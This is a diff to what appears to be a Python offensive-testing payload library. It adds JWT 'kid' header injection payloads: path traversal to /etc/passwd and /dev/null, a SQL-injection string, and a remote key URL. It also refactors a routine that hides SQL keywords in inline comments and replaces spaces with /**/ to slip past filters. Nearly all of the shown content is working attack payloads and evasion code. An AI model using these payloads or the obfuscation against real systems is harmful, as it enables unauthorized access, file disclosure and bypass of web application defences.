@@ -11,7 +11,7 @@ import html
 import random
 import string
 import urllib.parse
-from typing import Dict, List, Tuple
+from typing import Any, Dict, List, Optional, Tuple, cast
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -288,6 +288,14 @@ JWT_ATTACKS = {
         "/.well-known/jwks.json", "/jwks.json", "/api/auth/jwks",
         "/oauth/.well-known/jwks.json", "/.well-known/openid-configuration",
     ],
+    "kid_payloads": [
+        "../../../../../../../../etc/passwd",
+        "/dev/null",
+        "../../dev/null",
+        "0",
+        "' OR 1=1--",
+        "https://raw.githubusercontent.com/google/security-research/main/pwn.jwk"
+    ],
 }
 
 # ═══════════════════════════════════════════════════════════════════
@@ -462,7 +470,10 @@ class PayloadMutator:
         result = p
         for kw in ["SELECT", "UNION", "INSERT", "UPDATE", "DROP",
                    "DELETE", "OR", "AND", "WHERE", "FROM"]:
-            result = result.replace(kw, f"/*{kw[:1]}*/{kw[1:]}")
+            kw_str = str(kw)
+            first_char = str(cast(Any, kw_str)[0:1])
+            rest = str(cast(Any, kw_str)[1:])
+            result = result.replace(kw, f"/*{first_char}*/{rest}")
         return result.replace(" ", "/**/")
 
     @staticmethod
